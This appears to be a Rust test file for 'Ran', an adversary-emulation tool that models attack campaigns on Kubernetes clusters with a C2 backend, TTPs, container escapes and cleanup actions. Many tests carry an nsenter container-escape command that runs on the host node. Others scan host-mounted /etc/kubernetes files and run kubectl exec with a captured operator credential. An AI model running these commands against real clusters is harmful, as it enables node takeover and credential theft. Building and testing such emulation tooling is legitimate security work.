        !campaign.entities.contains::<K8sNode>(&stale_id),
        "placeholder node should have been removed"
    );

    // ContainerEscape edge should point at the real node, not the placeholder.
    let real_node_eid = EntityId::new("node/worker-node-1");
    let pod_eid = EntityId::new(&pod_id);
    let escape_edges = campaign.graph.targets_of(&pod_eid, "container.escape");
    assert!(
        escape_edges.contains(&&real_node_eid),
        "ContainerEscape edge should target the real node after merge"
    );
}

#[test]
fn sys_node_name_merges_placeholder_when_target_is_pod_after_escape() {
    // The escape TTP may be attributed to the pod (semantic target = pod),
    // and the follow-up hostname command is also targeted at the pod.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    let placeholder = K8sNode::new("escape_attacker");
    let placeholder_id = placeholder.entity_id().0.clone();
    campaign.entities.insert_typed(placeholder);
    push_relation(&mut campaign, &RunsOn::new(&pod_id, &placeholder_id));
    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &placeholder_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}".to_string()),
    );

    // sys.node-name targeted at the pod (not the node).
    let cmd = sample_exec_ttp(&pod_id, vec!["sys.node-name"]);
    let event = sample_event("worker-node-2");

    campaign
        .on_ttp_executed(&cmd, &event)
        .expect("should succeed");

    let real_id = EntityId::new("node/worker-node-2");
    assert!(
        campaign.entities.contains::<K8sNode>(&real_id),
        "real node should exist"
    );
    assert!(
        !campaign
            .entities
            .contains::<K8sNode>(&EntityId::new(&placeholder_id)),
        "placeholder should be gone"
    );
}

#[test]
fn sys_node_name_preserves_access_level_from_placeholder_node() {
    // The placeholder node gets AccessLevel::Exec when the ContainerEscape edge
    // is inserted. After sys.node-name resolves the real name, the access level
    // must be preserved on the real node via merge_node_entities.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod = Pod::new("victim", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    let placeholder = K8sNode::new("escape_victim");
    let placeholder_id = placeholder.entity_id().0.clone();
    campaign.entities.insert_typed(placeholder);
    push_relation(&mut campaign, &RunsOn::new(&pod_id, &placeholder_id));
    // ContainerEscape edge upgrades the placeholder node's AccessLevel to Exec.
    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &placeholder_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}".to_string()),
    );

    // Sanity check: placeholder has Exec access.
    let ph_eid = EntityId::new(&placeholder_id);
    let ph_access = campaign
        .entities
        .find::<K8sNode>(&ph_eid)
        .map(|n| n.system.access_level);
    assert_eq!(
        ph_access,
        Some(AccessLevel::Exec),
        "placeholder must have Exec access"
    );

    // sys.node-name targeted at the placeholder node resolves the real name.
    let cmd = sample_exec_ttp(&placeholder_id, vec!["sys.node-name"]);
    let event = sample_event("worker-4");
    campaign
        .on_ttp_executed(&cmd, &event)
        .expect("should succeed");

    // Real node should inherit the Exec access level from the placeholder.
    let real_eid = EntityId::new("node/worker-4");
    let real_access = campaign
        .entities
        .find::<K8sNode>(&real_eid)
        .map(|n| n.system.access_level);
    assert_eq!(
        real_access,
        Some(AccessLevel::Exec),
        "real node must inherit Exec access level from placeholder"
    );
}

// ---------------------------------------------------------------------------
// ContainerEscape relation tests
// ---------------------------------------------------------------------------

#[test]
fn container_escape_relation_routes_to_node() {
    // When a ContainerEscape relation exists pod → node,
    // resolve_exec_channel for the node should hop through the pod.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // Compromised pod (C2 has direct exec into it).
    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    // Node the pod runs on.
    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    // Escape relation: pod → node with nsenter envelope.
    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &node_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}"),
    );
    push_relation(&mut campaign, &RunsOn::new(&pod_id, &node_id));

    let ch = campaign
        .resolve_exec_channel(&node_id)
        .expect("should route to node via container escape edge");

    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(ch.hops, vec![pod_id], "should hop through attacker pod");
}

#[test]
fn container_escape_routes_node_through_pod_session_when_active() {
    // When the pod has an active kubectl-exec session, routing to the node via
    // ContainerEscape should use that session as the backend so nsenter-wrapped
    // commands travel through the interactive shell instead of a fresh exec.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut pod = Pod::new("attacker", "default");
    let session_id = "ns-default-pod-attacker";
    pod.system.sessions.push(SessionInfo {
        id: session_id.to_string(),
        kind: "kubectl-exec".to_string(),
        port: None,
        status: SessionStatus::Active,
    });
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "c2/ran", &pod_id);

    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &node_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}"),
    );
    push_relation(&mut campaign, &RunsOn::new(&pod_id, &node_id));

    let ch = campaign
        .resolve_exec_channel(&node_id)
        .expect("should route to node via container escape edge");

    assert_eq!(
        ch.backend_id, BUILTIN_C2_ID,
        "campaign routing should stay on c2/ran; session upgrade happens in C2 manager"
    );
    assert_eq!(
        ch.hops,
        vec![pod_id],
        "should still hop through attacker pod"
    );
}

#[test]
fn hostname_on_placeholder_node_updates_entity_id_after_escape() {
    // After a container escape the placeholder node is named after the pod's
    // short name.  Running hostname (sys.node-name) on the placeholder should
    // alias it to the real node and migrate all edges.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut pod = Pod::new("attacker", "default");
    pod.system.sessions.push(SessionInfo {
        id: "ns-default-pod-attacker".to_string(),
        kind: "kubectl-exec".to_string(),
        port: None,
        status: SessionStatus::Active,
    });
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "c2/ran", &pod_id);

    // Placeholder node produced by container.escape when no node name was known.
    let placeholder = K8sNode::new("escape_attacker");
    let placeholder_id = placeholder.entity_id().0.clone();
    campaign.entities.insert_typed(placeholder);
    push_relation(&mut campaign, &RunsOn::new(&pod_id, &placeholder_id));
    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &placeholder_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}"),
    );

    // hostname is targeted at the placeholder node; returns the real node name.
    let cmd = sample_exec_ttp(&placeholder_id, vec!["sys.node-name"]);
    let event = sample_event("gke-cluster-worker-1");
    campaign
        .on_ttp_executed(&cmd, &event)
        .expect("should succeed");

    let real_id = EntityId::new("node/gke-cluster-worker-1");
    assert!(
        campaign.entities.contains::<K8sNode>(&real_id),
        "real node should exist after hostname update"
    );
    assert!(
        !campaign
            .entities
            .contains::<K8sNode>(&EntityId::new(&placeholder_id)),
        "placeholder node/escape_attacker should be removed"
    );

    // ContainerEscape and RunsOn edges should point at the real node.
    let pod_eid = EntityId::new(&pod_id);
    let escape_targets = campaign.graph.targets_of(&pod_eid, "container.escape");
    assert!(
        escape_targets.contains(&&real_id),
        "ContainerEscape edge should target the real node after hostname update"
    );

    // Routing to the real node should still go through the pod's session.
    let ch = campaign
        .resolve_exec_channel(&real_id.0)
        .expect("should route via ContainerEscape");
    assert_eq!(ch.hops, vec![pod_id], "should hop through the pod");
}

#[test]
fn container_escape_upgrades_node_access_level() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    // Before escape: node has no exec access.
    assert_eq!(
        campaign
            .entities
            .find::<K8sNode>(&EntityId::new(&node_id))
            .unwrap()
            .system
            .access_level,
        AccessLevel::None
    );

    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &node_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}"),
    );

    // After escape: node access_level should be Exec.
    assert_eq!(
        campaign
            .entities
            .find::<K8sNode>(&EntityId::new(&node_id))
            .unwrap()
            .system
            .access_level,
        AccessLevel::Exec,
        "node should have Exec access after ContainerEscape relation is inserted"
    );
}

#[test]
fn container_escape_envelope_wraps_command_correctly() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);
    push_relation(
        &mut campaign,
        &ContainerEscape::new(&pod_id, &node_id)
            .with_envelope("nsenter -t 1 -m -u -i -n -p -- ${CMD}"),
    );

    // The graph edge should carry the envelope.
    let summaries = campaign.graph.to_relation_summaries();
    let escape_edge = summaries
        .iter()
        .find(|r| r.name == "container.escape")
        .expect("container.escape edge should be in graph");

    assert_eq!(
        escape_edge.envelope.as_deref(),
        Some("nsenter -t 1 -m -u -i -n -p -- ${CMD}")
    );

    // wrap_command should substitute ${CMD}.
    let wrapped = escape_edge.wrap_command("id");
    assert_eq!(wrapped, "nsenter -t 1 -m -u -i -n -p -- id");
}

#[test]
fn container_escape_effect_creates_node_when_runs_on_exists_in_graph() {
    // When the pod already has a runs-on edge, the effect should reuse that
    // node (via TARGET_NODE_ID injected from the graph in on_ttp_executed).
    // This test validates the effect handler directly with a pre-populated ctx.
    use crate::effects::parse_effect;
    let mut ctx = std::collections::HashMap::new();
    ctx.insert("TARGET_NODE_ID".into(), "node/worker-1".into());
    ctx.insert(
        "PROCEDURE_CMD".into(),
        "nsenter -t 1 -m -u -i -n -p -- ${CMD}".into(),
    );

    let pod_id = "ns/default/pod/attacker";
    let update = parse_effect(&format!("container.escape({})", pod_id), &ctx).unwrap();

    // Node entity emitted.
    assert_eq!(update.new_entities.len(), 1);
    let node = update.new_entities[0]
        .as_any()
        .downcast_ref::<K8sNode>()
        .unwrap();
    assert_eq!(node.entity_name(), "worker-1");

    // Both RunsOn and ContainerEscape emitted.
    assert_eq!(update.new_relations.len(), 2);
    let ro = update
        .new_relations
        .iter()
        .find(|r| r.relation_name() == "runs-on")
        .unwrap();
    assert_eq!(ro.target_id().0, "node/worker-1");
    let esc = update
        .new_relations
        .iter()
        .find(|r| r.relation_name() == "container.escape")
        .unwrap();
    assert_eq!(esc.target_id().0, "node/worker-1");
}

#[test]
fn container_escape_effect_creates_placeholder_node_when_no_node_known() {
    use crate::effects::parse_effect;
    let ctx = std::collections::HashMap::new();

    let pod_id = "ns/default/pod/attacker";
    let update = parse_effect(&format!("container.escape({})", pod_id), &ctx).unwrap();

    // Node entity still emitted (placeholder).
    assert_eq!(update.new_entities.len(), 1);
    // Both relations still emitted.
    assert_eq!(update.new_relations.len(), 2);
    // Source is correct on the escape edge.
    let esc = update
        .new_relations
        .iter()
        .find(|r| r.relation_name() == "container.escape")
        .unwrap();
    assert_eq!(esc.source_id().0, pod_id);
    // RunsOn and ContainerEscape target the same (placeholder) node.
    let ro = update
        .new_relations
        .iter()
        .find(|r| r.relation_name() == "runs-on")
        .unwrap();
    assert_eq!(ro.target_id(), esc.target_id());
}

#[test]
fn container_escape_node_is_authoritative_when_pod_has_node_name() {
    // When the pod entity has node_name set (from the K8s API), the node
    // created by container.escape should carry NameConfidence::Authoritative.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut pod = Pod::new("attacker", "default");
    pod.node_name = Some("worker-1".to_string());
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    let cmd = sample_exec_ttp(&pod_id, vec!["container.escape(sys)"]);
    let event = sample_event("ok");
    campaign
        .on_ttp_executed(&cmd, &event)
        .expect("should succeed");

    let node_eid = EntityId::new("node/worker-1");
    let node = campaign
        .entities
        .find::<K8sNode>(&node_eid)
        .expect("node/worker-1 should exist");
    assert_eq!(
        node.name_confidence,
        ran_domain::NameConfidence::Authoritative,
        "node from pod.node_name should be authoritative"
    );
}

#[test]
fn container_escape_placeholder_node_is_derived_when_pod_has_no_node_name() {
    // When the pod has no node_name, the placeholder node should be Derived.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    let cmd = sample_exec_ttp(&pod_id, vec!["container.escape(sys)"]);
    let event = sample_event("ok");
    campaign
        .on_ttp_executed(&cmd, &event)
        .expect("should succeed");

    let placeholder_eid = EntityId::new("node/escape_attacker");
    let node = campaign
        .entities
        .find::<K8sNode>(&placeholder_eid)
        .expect("node/escape_attacker should exist");
    assert_eq!(
        node.name_confidence,
        ran_domain::NameConfidence::Derived,
        "placeholder node should be derived"
    );
}

#[test]
fn src_mount_path_grounded_for_non_lateral_ttp() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // The exec system (pivot) — has a can-exec path to the target.
    let exec_pod = Pod::new("pivot", "default");
    let exec_id = exec_pod.entity_id().0.clone();
    campaign.entities.insert_typed(exec_pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &exec_id);

    // The target pod — this is where the command actually runs, so its
    // host_paths are what ${SRC.MOUNT_PATH} should resolve to.
    let mut target = Pod::new("target", "kube-system");
    target.volume_mounts.push(ran_domain::Mount {
        name: "host".to_string(),
        mount_root: "/".to_string(),
        mount_point: "/host".to_string(),
        mount_type: None,
        is_host_path: true,
        read_only: false,
    });
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);
    push_exec_edge(&mut campaign, &exec_id, &target_id);

    let armory = Armory::from_ttps(vec![Ttp {
        params: vec![TtpParam {
            name: "MOUNT_PATH".to_string(),
            param_type: "string".to_string(),
            description: "host mount path".to_string(),
            required: false,
            default: "${SRC.MOUNT_PATH}/etc/kubernetes".to_string(),
        }],
        procedures: vec![Procedure::new("grep", "grep -r ${MOUNT_PATH}")],
        ..Ttp::new("scan-node", "Search interesting Files", "Discovery")
    }]);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "scan-node".to_string(),
                target_id: target_id.clone(),
                exec_system_id: Some(exec_id.clone()),
                auth_identity_id: None,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should prepare action");

    assert!(
        exec.procedure.command.contains("/host/etc/kubernetes"),
        "expected ${{SRC.MOUNT_PATH}} resolved to /host, got: {}",
        exec.procedure.command
    );
}

// ---------------------------------------------------------------------------
// prepare_action_with_ttp — direct pipeline invocation
// ---------------------------------------------------------------------------

#[test]
fn prepare_action_with_ttp_produces_same_result_as_prepare_action() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let ttp = Ttp {
        procedures: vec![Procedure::new("shell", "id")],
        ..Ttp::new("test-ttp", "Test TTP", "Discovery")
    };

    let exec = campaign
        .prepare_action_with_ttp(
            target_id.clone(),
            None,
            None,
            None,
            ttp,
            std::collections::HashMap::new(),
            &Armory::from_ttps(vec![]),
        )
        .expect("should prepare action");

    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
    assert_eq!(exec.target_id, target_id);
}

// ---------------------------------------------------------------------------
// build_cleanup_actions tests
// ---------------------------------------------------------------------------

fn cleanup_armory() -> Armory {
    Armory::from_ttps(vec![
        Ttp {
            params: vec![TtpParam {
                name: "PKG".to_string(),
                param_type: "string".to_string(),
                description: String::new(),
                required: false,
                default: "curl".to_string(),
            }],
            procedures: vec![Procedure {
                tool: Some("apt".to_string()),
                ..Procedure::new("ubuntu", "apt-get install -y ${PKG}")
            }],
            cleanup: Some(Procedure {
                tool: Some("apt".to_string()),
                ..Procedure::new("ubuntu", "apt remove -y ${PKG}")
            }),
            ..Ttp::new("install-pkg", "Install Package", "Execution")
        },
        Ttp {
            procedures: vec![Procedure::new("shell", "id")],
            ..Ttp::new("no-cleanup", "No Cleanup TTP", "Discovery")
        },
    ])
}

#[test]
fn build_cleanup_actions_returns_one_action_for_ttp_with_cleanup() {
    use crate::execution_record::ExecutionRecord;
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("victim", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, BUILTIN_C2_ID, &pod_id);

    campaign.execution_records.push(ExecutionRecord {
        id: "cmd-1".to_string(),
        ttp_id: "install-pkg".to_string(),
        ttp_name: "Install Package".to_string(),
        tactic: "Execution".to_string(),
        target_id: pod_id.clone(),
        exec_system_id: BUILTIN_C2_ID.to_string(),
        auth_identity_id: None,
        procedure_id: "ubuntu".to_string(),
        command: "apt-get install -y curl".to_string(),
        args: std::collections::HashMap::from([("PKG".to_string(), "curl".to_string())]),
        success: true,
        exit_code: 0,
        results: vec![],
        fail_reason: String::new(),
        started_at_ms: 0,
        completed_at_ms: 1,
        is_cleanup: false,
        reasoning: String::new(),
    });
    campaign.execution_records.push(ExecutionRecord {
        id: "cmd-2".to_string(),
        ttp_id: "no-cleanup".to_string(),
        ttp_name: "No Cleanup TTP".to_string(),
        tactic: "Discovery".to_string(),
        target_id: pod_id.clone(),
        exec_system_id: BUILTIN_C2_ID.to_string(),
        auth_identity_id: None,
        procedure_id: "shell".to_string(),
        command: "id".to_string(),
        args: std::collections::HashMap::new(),
        success: true,
        exit_code: 0,
        results: vec![],
        fail_reason: String::new(),
        started_at_ms: 2,
        completed_at_ms: 3,
        is_cleanup: false,
        reasoning: String::new(),
    });

    let armory = cleanup_armory();
    let actions = campaign.build_cleanup_actions(&armory);

    assert_eq!(
        actions.len(),
        1,
        "only the TTP with a cleanup procedure should produce an action"
    );
    assert!(
        actions[0].is_cleanup,
        "cleanup action must have is_cleanup=true"
    );
    assert_eq!(actions[0].ttp.id, "install-pkg_cleanup");
    assert_eq!(actions[0].target_id, pod_id);
}

#[test]
fn build_cleanup_actions_preserves_original_args_in_cleanup_command() {
    use crate::execution_record::ExecutionRecord;
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("victim", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, BUILTIN_C2_ID, &pod_id);

    campaign.execution_records.push(ExecutionRecord {
        id: "cmd-1".to_string(),
        ttp_id: "install-pkg".to_string(),
        ttp_name: "Install Package".to_string(),
        tactic: "Execution".to_string(),
        target_id: pod_id.clone(),
        exec_system_id: BUILTIN_C2_ID.to_string(),
        auth_identity_id: None,
        procedure_id: "ubuntu".to_string(),
        command: "apt-get install -y wget".to_string(),
        args: std::collections::HashMap::from([("PKG".to_string(), "wget".to_string())]),
        success: true,
        exit_code: 0,
        results: vec![],
        fail_reason: String::new(),
        started_at_ms: 0,
        completed_at_ms: 1,
        is_cleanup: false,
        reasoning: String::new(),
    });

    let armory = cleanup_armory();
    let actions = campaign.build_cleanup_actions(&armory);

    assert_eq!(actions.len(), 1);
    assert!(
        actions[0].procedure.command.contains("wget"),
        "cleanup command should use original PKG=wget arg, got: {}",
        actions[0].procedure.command
    );
}

// ---------------------------------------------------------------------------
// materialize_k8s_request tests
// ---------------------------------------------------------------------------

use super::execution::materialize_k8s_request;

#[test]
fn active_kubeconfig_keeps_structured_request_for_native_execution() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let target_id = campaign
        .entities
        .values::<K8sCluster>()
        .next()
        .expect("cluster")
        .entity_id()
        .0;
    let mut credential = K8sCredential::new("https://cluster.example").with_name("operator");
    credential.active = true;
    let credential_id = credential.entity_id().0;
    campaign.entities.insert_typed(credential);
    let ttp = Ttp {
        status: "enabled".to_string(),
        procedures: vec![Procedure {
            k8s_request: Some(serde_json::json!({
                "api_server": "https://cluster.example",
                "api": "/api/v1",
                "resource": "namespaces",
                "cluster_scoped": true
            })),
            ..Procedure::new("k8s-request", "")
        }],
        ..Ttp::new("get-namespaces", "Get Namespaces", "Discovery")
    };
    let armory = Armory::from_ttps(vec![ttp]);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "get-namespaces".to_string(),
                exec_system_id: None,
                auth_identity_id: Some(credential_id.clone()),
                target_id,
                procedure_id: Some("k8s-request".to_string()),
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("active kubeconfig should prepare native request");

    assert_eq!(
        exec.auth_identity_id.as_deref(),
        Some(credential_id.as_str())
    );
    assert!(exec.procedure.k8s_request.is_some());
    assert_eq!(exec.procedure.command, "GET /api/v1/namespaces");
    assert!(exec.exec_chain.is_empty());
    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
}

#[test]
fn active_kubeconfig_request_uses_namespace_target_and_records_request_line() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let namespace = Namespace::new("dungeon");
    let target_id = namespace.entity_id().0;
    campaign.entities.insert_typed(namespace);
    let mut credential = K8sCredential::new("https://cluster.example").with_name("operator");
    credential.active = true;
    let credential_id = credential.entity_id().0;
    campaign.entities.insert_typed(credential);
    let ttp = Ttp {
        status: "enabled".to_string(),
        params: vec![
            TtpParam {
                name: "NS".to_string(),
                param_type: "Namespace".to_string(),
                description: String::new(),
                required: true,
                default: "${NS}".to_string(),
            },
            TtpParam {
                name: "ALL_NS".to_string(),
                param_type: "bool".to_string(),
                description: String::new(),
                required: true,
                default: "false".to_string(),
            },
        ],
        procedures: vec![Procedure {
            k8s_request: Some(serde_json::json!({
                "api_server": "https://cluster.example",
                "api": "/api/v1",
                "resource": "pods",
                "namespace": "${NS}",
                "cluster_scoped": "${ALL_NS}",
                "query": "limit=500"
            })),
            ..Procedure::new("k8s-request", "")
        }],
        ..Ttp::new("get-pods", "Get Pods", "Discovery")
    };
    let armory = Armory::from_ttps(vec![ttp]);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "get-pods".to_string(),
                exec_system_id: None,
                auth_identity_id: Some(credential_id),
                target_id,
                procedure_id: Some("k8s-request".to_string()),
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("namespaced native request should prepare");

    assert_eq!(exec.args.get("NS").map(String::as_str), Some("dungeon"));
    assert_eq!(
        exec.procedure.command,
        "GET /api/v1/namespaces/dungeon/pods?limit=500"
    );
    let request = exec.procedure.k8s_request.expect("structured request");
    assert_eq!(request["namespace"], "dungeon");
    assert_eq!(request["cluster_scoped"], "false");
}

fn repository_armory() -> Armory {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../armory/TTPs");
    Armory::load_from_dir(path).expect("repository armory should load")
}

fn valid_accounts_campaign() -> (Campaign, String, String) {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("target", "default");
    let pod_id = pod.entity_id().0;
    campaign.entities.insert_typed(pod);
    let mut credential = K8sCredential::new("https://cluster.example").with_name("operator");
    credential.active = true;
    let credential_id = credential.entity_id().0;
    campaign.entities.insert_typed(credential);
    (campaign, pod_id, credential_id)
}

#[test]
fn valid_accounts_one_shot_targets_selected_pod_authoritatively() {
    let (mut campaign, pod_id, credential_id) = valid_accounts_campaign();
    let armory = repository_armory();
    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: armory::VALID_ACCOUNTS_KUBECONFIG_ID.to_string(),
                target_id: pod_id.clone(),
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: Some("kubectl".to_string()),
                args: HashMap::from([
                    ("Interactive".to_string(), "false".to_string()),
                    ("Container".to_string(), "debug".to_string()),
                    ("NAMESPACE".to_string(), "other".to_string()),
                    ("PODNAME".to_string(), "wrong".to_string()),
                ]),
                reasoning: None,
            },
            &armory,
        )
        .expect("Valid Accounts one-shot should prepare");

    assert_eq!(exec.target_id, pod_id);
    assert_eq!(
        exec.auth_identity_id.as_deref(),
        Some(credential_id.as_str())
    );
    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
    assert_eq!(
        exec.procedure.command,
        "kubectl exec -n default target -c debug -- true"
    );
    assert_eq!(
        exec.args.get("NAMESPACE").map(String::as_str),
        Some("default")
    );
    assert_eq!(exec.args.get("PODNAME").map(String::as_str), Some("target"));
    assert_eq!(
        exec.ttp.effects,
        ["k8s.can-exec(c2/Ran, ns/default/pod/target)"]
    );
}

#[test]
fn valid_accounts_interactive_and_deprecated_alias_use_canonical_action() {
    let (mut campaign, pod_id, credential_id) = valid_accounts_campaign();
    let armory = repository_armory();
    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: armory::DEPRECATED_INITIAL_ACCESS_POD_EXEC_ID.to_string(),
                target_id: pod_id,
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: None,
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("deprecated ID should resolve to interactive Valid Accounts");

    assert_eq!(exec.ttp.id, armory::VALID_ACCOUNTS_KUBECONFIG_ID);
    assert_eq!(
        exec.auth_identity_id.as_deref(),
        Some(credential_id.as_str())
    );
    assert_eq!(exec.procedure.command, "c2.kubectl_exec()");
    assert!(exec.exec_chain.is_empty());
}

#[test]
fn valid_accounts_rejects_former_cluster_target_shape() {
    let (mut campaign, _, credential_id) = valid_accounts_campaign();
    let cluster_id = campaign
        .entities
        .values::<K8sCluster>()
        .next()
        .expect("cluster")
        .entity_id()
        .0;
    let error = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: armory::DEPRECATED_INITIAL_ACCESS_POD_EXEC_ID.to_string(),
                target_id: cluster_id,
                exec_system_id: None,
                auth_identity_id: Some(credential_id),
                procedure_id: None,
                args: HashMap::from([
                    ("Namespace".to_string(), "default".to_string()),
                    ("PodName".to_string(), "target".to_string()),
                ]),
                reasoning: None,
            },
            &repository_armory(),
        )
        .expect_err("Cluster-target compatibility must be removed");

    match error {
        ExecuteActionError::InvalidInput(message) => {
            assert!(message.contains("requires a Pod target"));
        }
        other => panic!("expected invalid input, got {other:?}"),
    }
}

#[test]
fn valid_accounts_grants_exec_edge_only_after_success() {
    fn prepare(campaign: &mut Campaign, target_id: &str) -> ExecTtp {
        campaign
            .prepare_action(
                ExecuteActionRequest {
                    action_id: armory::VALID_ACCOUNTS_KUBECONFIG_ID.to_string(),
                    target_id: target_id.to_string(),
                    exec_system_id: None,
                    auth_identity_id: None,
                    procedure_id: None,
                    args: HashMap::from([("Interactive".to_string(), "false".to_string())]),
                    reasoning: None,
                },
                &repository_armory(),
            )
            .expect("Valid Accounts action should prepare")
    }

    let (mut failed_campaign, failed_pod_id, _) = valid_accounts_campaign();
    let failed_exec = prepare(&mut failed_campaign, &failed_pod_id);
    let failed_event = TtpExecuted {
        id: failed_exec.id.clone(),
        success: false,
        results: vec!["forbidden".to_string()],
        exit_code: 1,
        fail_reason: "forbidden".to_string(),
        session_connected: None,
    };
    failed_campaign
        .on_ttp_executed(&failed_exec, &failed_event)
        .expect("failed execution should be recorded");
    assert!(!failed_campaign.reachable_pods().contains(&failed_pod_id));

    let (mut successful_campaign, successful_pod_id, _) = valid_accounts_campaign();
    let successful_exec = prepare(&mut successful_campaign, &successful_pod_id);
    let successful_event = TtpExecuted {
        id: successful_exec.id.clone(),
        success: true,
        results: vec!["ok".to_string()],
        exit_code: 0,
        fail_reason: String::new(),
        session_connected: None,
    };
    successful_campaign
        .on_ttp_executed(&successful_exec, &successful_event)
        .expect("successful execution should apply effects");
    assert!(successful_campaign
        .reachable_pods()
        .contains(&successful_pod_id));
}

/// Minimal armory with a curl tool TTP for use in k8s_request and http_request tests.
fn curl_armory() -> Armory {
    Armory::from_ttps(vec![Ttp {
        status: "disabled".to_string(),
        procedures: vec![Procedure {
            tool: Some("curl".to_string()),
            ..Procedure::new(
                "curl",
                concat!(
                    "curl -sS",
                    " {% if FOLLOW_REDIRECTS %}-L {% endif %}",
                    " -m ${TIMEOUT} -X ${METHOD}",
                    " {% if USE_CA %}{% if CA_PATH %}--cacert '${CA_PATH}' {% endif %}",
                    " {% else %}--insecure {% endif %}",
                    " {% for name, value in HEADERS %}-H \"{{ name }}: {{ value }}\" {% endfor %}",
                    " {% if PAYLOAD %}--data '${PAYLOAD}' {% endif %}",
                    " {% if OUTPUT %}-o '${OUTPUT}' {% endif %}",
                    " '${URL}'"
                ),
            )
        }],
        tool_slot: Some("http-request".to_string()),
        ..Ttp::new("curl", "curl", "Execution")
    }])
}

#[test]
fn materialize_k8s_request_namespaced_url() {
    let mut procedure = Procedure {
        k8s_request: Some(serde_json::json!({
            "api_server": "https://10.0.0.1:6443",
            "api": "/api/v1",
            "resource": "pods",
            "namespace": "default",
            "cluster_scoped": "false",
            "query": "limit=500",
            "token": "mytoken",
            "use_ca": false
        })),
        ..Procedure::new("k8s-request", "")
    };
